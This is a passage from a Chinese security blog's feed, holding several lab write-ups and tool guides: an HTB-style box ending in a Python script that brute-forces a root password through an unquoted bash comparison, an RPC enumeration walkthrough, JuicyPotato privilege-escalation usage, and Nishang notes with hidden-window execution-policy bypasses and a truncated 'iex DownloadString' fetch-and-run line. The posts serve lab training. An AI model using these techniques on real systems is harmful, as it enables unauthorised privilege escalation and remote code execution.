alt="image-20231112202847512"></p><p>接着使用python提供的简易web服务器，将这个内容放到我们的本地web服务器上</p><p><img src="https://image.icewindy.cn/2023/11/02e94ed1eb773e28d06e9984bffaad10.png" alt="image-20231112202915654"></p><p>编写远程执行的指令，并开启监听</p><p><img src="https://image.icewindy.cn/2023/11/a5143fa2faaaca44201019ddc2cd36b4.png" alt="image-20231112203149681"></p><p>成功拿到shell。通过ifconfig可以验证得知，确实为目标靶机。</p><p>但是这个用户权限似乎非常受限，大部分目录都无法进入。既然是这个用户执行的web页面，也许可以到web页面的目录下面看看。</p><p>进入到/var/www/contact下，发现一个db文件，并且具有查看的权限，我们在里面找到了joshua用户的密码哈希</p><p><img src="https://image.icewindy.cn/2023/11/5cc1757a4089fb34f61d00688ef51c1e.png" alt="image-20231112203654417"></p><p>直接使用jonh进行hash爆破</p><p><img src="https://image.icewindy.cn/2023/11/1036e1890dd124677298694bce97a724.png" alt="image-20231112204150191"></p><p>得到密码为spongebob1，利用这个密码我们尝试进行ssh登录</p><p><img src="https://image.icewindy.cn/2023/11/619be2cb02f128dbe81e064fcaf92344.png" alt="image-20231112204313288"></p><p>成功进入，并拿到userflag</p><p><img src="https://image.icewindy.cn/2023/11/fe614b36a13c7c4e687ae5879f7f2b1e.png" alt="image-20231112204356093"></p><p>看看这个用户的sudo的权限有那些</p><p><img src="https://image.icewindy.cn/2023/11/b4ef38f28f2f2b17ea24c4ec8789fa15.png" alt="image-20231112204731906"></p><h2 id="通过mysql-backup-sh拿到root权限">通过mysql-backup.sh拿到root权限</h2><p><img src="https://image.icewindy.cn/2023/11/5a723d9ee5594a85a7513b99ce4d7d93.png" alt="image-20231112205208018"></p><p>这个是<code>mysql-backup.sh</code>，以下是chatgpt的代码解读</p><ol><li><p><strong>变量定义</strong>:</p><ul><li><code>DB_USER=&quot;root&quot;</code>: 定义数据库用户名为<code>root</code>。</li><li><code>DB_PASS=$(/usr/bin/cat /root/.creds)</code>: 从<code>/root/.creds</code>文件中读取数据库密码，并将其存储在<code>DB_PASS</code>变量中。</li></ul></li><li><p><strong>密码确认</strong>:</p><ul><li><code>read -s -p &quot;Enter MySQL password for $DB_USER: &quot; USER_PASS</code>: 以安静模式（不显示输入）提示用户输入MySQL的密码，并将输入存储在<code>USER_PASS</code>变量中。</li><li><code>if [[ $DB_PASS == $USER_PASS ]]; then ... else ... fi</code>: 检查用户输入的密码是否与存储的密码匹配。如果匹配，则继续执行脚本；如果不匹配，则显示错误消息并退出脚本。</li></ul></li><li><p><strong>创建备份目录</strong>:</p><ul><li><code>BACKUP_DIR=&quot;/var/backups/mysql&quot;</code>: 定义备份目录的路径。</li><li><code>/usr/bin/mkdir -p &quot;$BACKUP_DIR&quot;</code>: 创建备份目录，如果目录已经存在，则不会报错。</li></ul></li><li><p><strong>获取数据库列表并进行备份</strong>:</p><ul><li><p><code>databases=$(/usr/bin/mysql -u &quot;$DB_USER&quot; ... -e &quot;SHOW DATABASES;&quot; | /usr/bin/grep -Ev &quot;(Database|information_schema|performance_schema)&quot;)</code>: 运行MySQL命令来获取数据库列表，排除系统数据库。</p></li><li><p>for db in $databases; do … done</p><p>: 对于获取的每个数据库，执行以下操作：</p><ul><li>打印正在备份的数据库名称。</li><li>使用<code>mysqldump</code>命令备份数据库，并将输出压缩成<code>.gz</code>格式保存在指定的备份目录下。</li></ul></li></ul></li><li><p><strong>完成备份后的操作</strong>:</p><ul><li>打印所有数据库备份成功的消息。</li><li>更改备份目录的所有者为<code>root</code>用户和<code>sys-adm</code>组。</li><li>设置备份目录的权限为774（用户和组具有读、写、执行权限，其他人有读权限）。</li></ul></li><li><p><strong>脚本结束</strong>:</p><ul><li>打印完成消息。</li></ul></li></ol><p>这里的脚本有一个不安全的点，在变量比较时未使用引号</p><p><a href="https://github.com/anordal/shellharden/blob/master/how_to_do_things_safely_in_bash.md">shellharden/how_to_do_things_safely_in_bash.md at master · anordal/shellharden (github.com)</a></p><p><img src="https://image.icewindy.cn/2023/11/b4650655db04f7fc1b514c5b15de777d.png" alt=""></p><p>在<code>==</code>的左边没有使用双引号的话，会让bash认为是在执行模式匹配，而不是字符串匹配。这将会导致可以利用 <code>&#123;valid_password_char&#125;&#123;*&#125;</code> 这样的模式进行匹配比较。对此我们可以使用脚本对该sh爆破。利用大佬编写的python脚本对其进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="built_in">all</span> = <span class="built_in">list</span>(string.ascii_letters + string.digits)</span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">        command = <span class="string">f&quot;echo &#x27;<span class="subst">&#123;password&#125;</span><span class="subst">&#123;character&#125;</span>*&#x27; | sudo /opt/scripts/mysql-backup.sh&quot;</span></span><br><span class="line">        output = subprocess.run(command, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="literal">True</span>).stdout</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Password confirmed!&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">            password += character</span><br><span class="line">            <span class="built_in">print</span>(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        found = <span class="literal">True</span></span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/2023/11/7ef173a169d5db31e7f0d2754ae9102f.png" alt="image-20231112205505385"></p><p>拿到root权限</p><p><img src="https://image.icewindy.cn/2023/11/33665c6c60103b983a142f10807db0a5.png" alt="image-20231112205537978"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB靶机-APT</title>
      <link href="/2023/09/24/HTB%E9%9D%B6%E6%9C%BA-APT/"/>
      <url>/2023/09/24/HTB%E9%9D%B6%E6%9C%BA-APT/</url>
      
        <content type="html"><![CDATA[<h2 id="nmap扫描">Nmap扫描</h2><p><strong>tcp端口扫描</strong></p><p><img src="https://image.icewindy.cn/2024/02/f79bf7b14fc620a9a8bfebcbd10fe1ca.png" alt="image-20240212151931745"></p><p><strong>udp端口扫描</strong></p><p><img src="https://image.icewindy.cn/2024/02/73c99bb98d35c9b3f4156d94faf059cb.png" alt="image-20240212152025613"></p><p>无开放端口</p><p><strong>详细信息扫描</strong></p><p><img src="https://image.icewindy.cn/2024/02/bab8f5d37c9580d73fb9ff7f14771bb0.png" alt="image-20240212152057563"></p><p>服务分别是</p><p>80：微软的IIS服务器，版本号为10.0，一个web服务</p><p>135：windows远程过程调用</p><p>服务器系统为Windows Server，大概率为2016</p><h2 id="80端口尝试">80端口尝试</h2><p>由于80端口开放，且为一个Web服务，我们来访问看看</p><p><img src="https://image.icewindy.cn/2024/02/089ef895756ca4d780f505212584e260.png" alt="image-20240212153223605"></p><p>应该是一个提供虚拟主机服务的网站，网页使用到的技术我们可以用工具看到</p><p><img src="https://image.icewindy.cn/2024/02/04af4c15717707dc7f347b2e889a9c68.png" alt="image-20240212153434921"></p><p>发现在support页面存在一个表单，我们随便填写一些信息提交看看有什么反应</p><p><img src="https://image.icewindy.cn/2024/02/79c42268f8f19828ce64658d8ccdb228.png" alt="image-20240212154401040"></p><p>发现连接不上提交到的站点，那似乎没有利用价值了。通过查看源码可知，这个网站是该地址的镜像网站，所以我们连接不上</p><p><img src="https://image.icewindy.cn/2024/02/7207c54abb6efd41c5b89df845d54a69.png" alt="image-20240212154600316"></p><p>并且我们得到了一个信息，网页是由HTTrack Website Copier/3.x制作的，但是通过我们检索，发现并没有什么可以利用的漏洞。</p><p><strong>目录爆破</strong></p><p>尝试使用目录爆破，看看有没有可用的目录</p><p><img src="https://image.icewindy.cn/2024/02/f6fe91d264ad1f14b7d8022028414594.png" alt="image-20240212154741065"></p><p>并没有扫描可用的信息。</p><h2 id="135端口尝试">135端口尝试</h2><p>由于135端口是一个rpc服务，所以首先想到的是rpcclient。</p><p>使用rpcclient尝试与135端口进行连接</p><p><img src="https://image.icewindy.cn/2024/02/d48d9b91bd5e59397ef56826061a98e7.png" alt="image-20240212165805609"></p><p>然而并不可行。我们来尝试一下其他的rpc工具，例如python-impacket里的rpcmap.py工具</p><p><img src="https://image.icewindy.cn/2024/02/95e33a9208249208c877964446ab1bb4.png" alt="image-20240212171524188"></p><p>使用<code>rpcmap.py 'ncacn_ip_tcp:10.10.10.213[135]'</code>枚举出所有的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 00000136-0000-0000-C000-000000000046 v0.0</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 000001A0-0000-0000-C000-000000000046 v0.0</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.1</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 1D55B526-C137-46C5-AB79-638F2A68E869 v1.0</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.2</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 64FE0B7F-9EF5-4553-A7DB-9A1975777554 v1.0</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0</span><br><span class="line"></span><br><span class="line">Protocol: [MS-RPCE]: Remote Management Interface</span><br><span class="line">Provider: rpcrt4.dll</span><br><span class="line">UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.2</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: C6F3EE72-CE7E-11D1-B71E-00C04FC3111A v1.0</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: E60C73E6-88F9-11CF-9AF1-0020AF6E72F4 v2.0</span><br></pre></td></tr></table></figure><p>我们要对这些uuid进行进一步爆破，看他是什么内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">❯ rpcmap.py &#x27;ncacn_ip_tcp:10.10.10.213[135]&#x27; -brute-uuids -brute-opnums</span><br><span class="line">Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 00000136-0000-0000-C000-000000000046 v0.0</span><br><span class="line">Opnums 0-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 000001A0-0000-0000-C000-000000000046 v0.0</span><br><span class="line">Opnums 0-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.0</span><br><span class="line">Opnums 0-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.1</span><br><span class="line">Opnums 0-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 1D55B526-C137-46C5-AB79-638F2A68E869 v1.0</span><br><span class="line">Opnums 0-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.0</span><br><span class="line">Opnums 0-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.2</span><br><span class="line">Opnums 0-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0</span><br><span class="line">Opnums 0-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 64FE0B7F-9EF5-4553-A7DB-9A1975777554 v1.0</span><br><span class="line">Opnums 0-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0</span><br><span class="line">Opnum 0: rpc_x_bad_stub_data</span><br><span class="line">Opnum 1: rpc_x_bad_stub_data</span><br><span class="line">Opnum 2: rpc_x_bad_stub_data</span><br><span class="line">Opnum 3: success</span><br><span class="line">Opnum 4: rpc_x_bad_stub_data</span><br><span class="line">Opnum 5: success</span><br><span class="line">Opnums 6-64: nca_s_op_rng_error (opnum not found)</span><br><span class="line"></span><br><span class="line">Protocol: [MS-RPCE]: Remote Management Interface</span><br><span class="line">Provider: rpcrt4.dll</span><br><span class="line">UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0</span><br><span class="line">Opnum 0: success</span><br><span class="line">Opnum 1: rpc_x_bad_stub_data</span><br><span class="line">Opnum 2: success</span><br><span class="line">Opnum 3: success</span><br><span class="line">Opnum 4: rpc_x_bad_stub_data</span><br><span class="line">Opnums 5-64: nca_s_op_rng_error (opnum not found)</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.0</span><br><span class="line">Opnums 0-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.2</span><br><span class="line">Opnums 0-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: C6F3EE72-CE7E-11D1-B71E-00C04FC3111A v1.0</span><br><span class="line">Opnums 0-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0</span><br><span class="line">Opnum 0: rpc_fault_cant_perform</span><br><span class="line">Opnum 1: rpc_fault_cant_perform</span><br><span class="line">Opnum 2: rpc_x_bad_stub_data</span><br><span class="line">Opnum 3: rpc_x_bad_stub_data</span><br><span class="line">Opnum 4: rpc_x_bad_stub_data</span><br><span class="line">Opnum 5: rpc_fault_cant_perform</span><br><span class="line">Opnum 6: rpc_fault_cant_perform</span><br><span class="line">Opnum 7: rpc_x_bad_stub_data</span><br><span class="line">Opnum 8: rpc_x_bad_stub_data</span><br><span class="line">Opnums 9-64: nca_s_op_rng_error (opnum not found)</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: E60C73E6-88F9-11CF-9AF1-0020AF6E72F4 v2.0</span><br><span class="line">Opnums 0-64: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">[*] Tested 354 UUID(s)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核提权-JuicyPotato</title>
      <link href="/2023/07/30/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83-JuicyPotato/"/>
      <url>/2023/07/30/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83-JuicyPotato/</url>
      
        <content type="html"><![CDATA[<h2 id="juicypotato简介">JuicyPotato简介</h2><p>JuciyPotato俗称烂土豆，是一个基于MS16-075漏洞利用工具RottenPotatoN上改进的内核提权工具。<a href="https://github.com/ohpe/juicy-potato">ohpe/juicy-potato: A sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM. (github.com)</a></p><h2 id="功能简介">功能简介</h2><p>据页面的介绍，烂土豆可以让你做下面这些事情</p><ul><li><strong>Target CLISID</strong> 选择任何你想要的CLISID。在<a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">这里</a>有一个列表可以找到</li><li><strong>COM Listening port</strong> 设置DOM监听端口</li><li><strong>COM Listening IP address</strong> 设置DOM监听的IP地址</li><li><strong>Process creation mode</strong> 进程创建的模式。可以选择下面几种模式：<ul><li><code>CreateProcessWithToken</code> （需要 <code>SeImpersonate</code> 权限）</li><li><code>CreateProcessAsUser</code> （需要 <code>SeAssignPrimaryToken</code> 权限）</li><li><code>both</code></li></ul></li><li><strong>Process to launch</strong> 如果JuicyPotato运行成功，则启动可执行文件或脚本</li><li><strong>RPC Server port RPC</strong> 、<strong>RPC Server address RPC</strong> 与RPC服务器进行交互</li></ul><h2 id="使用方法">使用方法</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">T:\&gt;<span class="title">JuicyPotato.exe</span></span></span><br><span class="line"><span class="function"><span class="title">JuicyPotato</span> <span class="title">v0</span>.1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">必须使用的参数:</span></span><br><span class="line"><span class="function">-<span class="title">t</span> <span class="title">createprocess</span>调用: &lt;<span class="title">t</span>&gt; <span class="title">CreateProcessWithTokenW</span>, &lt;<span class="title">u</span>&gt; <span class="title">CreateProcessAsUser</span>, &lt;*&gt; <span class="title">try</span> <span class="title">both</span></span></span><br><span class="line"><span class="function">-<span class="title">p</span> &lt;<span class="title">program</span>&gt;: 运行指定程序</span></span><br><span class="line"><span class="function">-<span class="title">l</span> &lt;<span class="title">port</span>&gt;: <span class="title">COM</span>服务器监听端口</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">选项参数:</span></span><br><span class="line"><span class="function">-<span class="title">m</span> &lt;<span class="title">ip</span>&gt;: <span class="title">COM</span>服务器监听地址 (默认 127.0.0.1) </span></span><br><span class="line"><span class="function">-<span class="title">a</span> &lt;<span class="title">argument</span>&gt;: 传递给程序命令行参数 (默认 <span class="title">NULL</span>)</span></span><br><span class="line"><span class="function">-<span class="title">k</span> &lt;<span class="title">ip</span>&gt;: <span class="title">RPC</span>服务器监听地址 (默认 127.0.0.1)</span></span><br><span class="line"><span class="function">-<span class="title">n</span> &lt;<span class="title">port</span>&gt;: <span class="title">RPC</span>服务器监听端口 (默认 135)</span></span><br><span class="line"><span class="function">-<span class="title">c</span> &lt;&#123;<span class="title">clsid</span>&#125;&gt;: <span class="title">CLSID</span> (默认 <span class="title">BITS</span>:&#123;4991<span class="title">d34b</span>-80<span class="title">a1</span>-4291-83<span class="title">b6</span>-3328366<span class="title">b9097</span>&#125;)</span></span><br><span class="line"><span class="function">-<span class="title">z</span> 仅测试<span class="title">CLSID</span>并打印令牌的用户</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Powershell渗透测试工具-Nishang</title>
      <link href="/2023/07/30/Powershell%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-nishang/"/>
      <url>/2023/07/30/Powershell%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-nishang/</url>
      
        <content type="html"><![CDATA[<p>Nishang是一个针对Powershell的渗透测试工具，集成了框架、脚本和各种Payload，包括了下载和执行、键盘记录、DNS、延时命令等脚本。</p><h2 id="nishang安装">Nishang安装</h2><p>首先我们需要去到Github上下载<a href="https://github.com/samratashok/nishang">Nishang</a>，直接从Releases下载即可。下载下来后解压我们得到一个文件夹。</p><h3 id="目录">目录</h3><p><img src="https://image.icewindy.cn/2023/09/07b91f8ca82f4da060bd5f614b4b35f1.png" alt="image-20230911162553026"></p><p>这文件夹代表了Nishang的不同模块</p><p><img src="https://image.icewindy.cn/2023/09/b8c2baa211333b06d814e1942aa98942.png" alt="bdd784723336d2baa08333d151b0a744"></p><p>在渗透测试中，这些工具往往我们需要提取出来使用，而不是一整个贴到被渗透服务器中，因此需要我们对Nishang的目录结构有所了解。</p><h3 id="bypass执行策略">Bypass执行策略</h3><p>Powershell的默认执行策略是Restricted的，而Restricted是不允许任何脚本运行的。因此我们需要一些手段去Bypass执行策略。Bypass执行策略的十五种方法可以参考这篇https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/。</p><p>从别人那参考来的三个常用的方式：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>. <span class="built_in">Set-ExecutionPolicy</span> <span class="literal">-Scope</span> CurrentUser <span class="literal">-ExecutionPolicy</span> Unrestricted //设置当前用户的执行策略为Unrestricted，更改了当前的全局策略</span><br><span class="line"><span class="number">1</span>. powershell.exe <span class="literal">-executionpolicy</span> bypass <span class="literal">-Windowstyle</span> <span class="keyword">hidden</span> <span class="literal">-noninteractive</span> <span class="literal">-nologo</span> <span class="operator">-File</span> //或是下面这种，<span class="literal">-Windowstyle</span> <span class="keyword">hidden</span> 可以让我们的执行无任何弹窗</span><br><span class="line"><span class="number">2</span>. PowerShell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="operator">-File</span></span><br></pre></td></tr></table></figure><p>在我们本机环境中，我们可以改变全局执行策略，以执行其他用户编写的ps脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set-executionpolicy</span> remotesigned</span><br></pre></td></tr></table></figure><p>然后我们就可以导入nishang模块了</p><p><img src="https://image.icewindy.cn/2023/09/cf16a0377ddd8be6d6af5a4b8050210f.png" alt="image-20230911163409072"></p><p>接下来我们可以用下面命令来验证</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Command</span> <span class="literal">-Module</span> nishang</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/2023/09/7911bb9ff1b9dd05a3de9204f4e39017.png" alt="image-20230911163631365"></p><p>可以看到已经成功导入了。在之后的使用中，我们可以使用”Get-Help”命令来获取当前脚本的用法和说明等</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Help</span> <span class="built_in">Get-Wlan</span><span class="literal">-Keys</span></span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/2023/09/2c00bff0765a7cde23b639d7a2b05d9b.png" alt="image-20230911163801471"></p><h3 id="内存中加载脚本">内存中加载脚本</h3><p>第一种是通过远程下载的方式</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">iex</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span 